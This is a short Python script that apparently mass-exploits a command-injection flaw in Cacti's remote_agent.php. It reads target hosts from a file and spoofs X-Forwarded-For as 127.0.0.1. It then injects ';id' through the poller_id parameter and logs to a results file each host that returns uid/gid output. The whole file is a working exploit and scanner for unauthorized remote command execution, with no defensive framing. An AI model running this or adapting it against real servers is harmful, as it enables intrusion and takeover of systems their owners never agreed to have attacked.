import requests
import sys

def main():
    filea = sys.argv[1]

    with open(filea, 'r') as file:
        for line in file:
            host = "http://"+line.strip()
            headers = {
                'X-Forwarded-For': '127.0.0.1'
            }

            try:
                httpResponse = requests.get(host + '/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id', headers=headers, verify=False)
                print(host)
                if('uid=' in httpResponse.text and 'gid=' in httpResponse.text):
                    with open('result2.txt', 'a') as file1:
                        file1.write(host+'\n')
                    file1.close()
                if 'local_data_id' in httpResponse.text:
                    print(f" [error] {host} appears to be vulnerable")
            except:
                a=0
            

if __name__ == '__main__':
    main()
